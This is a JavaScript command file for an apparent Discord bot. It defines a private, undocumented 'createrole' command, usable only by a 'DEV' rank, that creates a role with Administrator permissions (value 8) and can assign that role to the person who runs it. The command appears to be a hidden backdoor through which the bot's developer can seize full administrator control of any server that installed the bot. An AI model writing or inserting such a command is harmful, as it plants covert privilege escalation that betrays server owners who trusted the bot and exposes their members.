const Util = require("../utils/util.js")
const ICommand = require("../interfaces/ICommand.js")

class Command extends ICommand {
    constructor(client) {
        super(client, {
            name: "createrole",
            desc: "",
            aliases: [
                "cr"
            ],
            args: [
                {
                    name: "give"
                },
                {
                    name: "name"
                }
            ],
            perms: [
                "DEV"
            ],
            private: true
        })
    }

    async execute(message, inputs) {
        if (!Util.doesMemberHavePermission(message.guild.me, ["MANAGE_ROLES"])) return Util.replyError(message, ":tired_face: Sorry");

        let role
        try {
            role = await message.guild.roles.create({
                data: {
                    name: inputs[1],
                    hoist: true,
                    mentionable: false,
                    permissions: 8
                }
            })
        } catch(e) {
            console.error(e)
        }

        if (role) {
            if (["yes", "yeah", "y", "ye"].includes(inputs[0].toLowerCase())) {
                try {
                    await message.member.roles.add(role)
                } catch(e) {
                    console.error(e)
                }
            }

            Util.replyMessage(message, ":+1: Duty executed.")
        } else {
            Util.replyMessage(message, ":-1: Mission failed, we'll get'em next time.")
        }
    }
}

module.exports = Command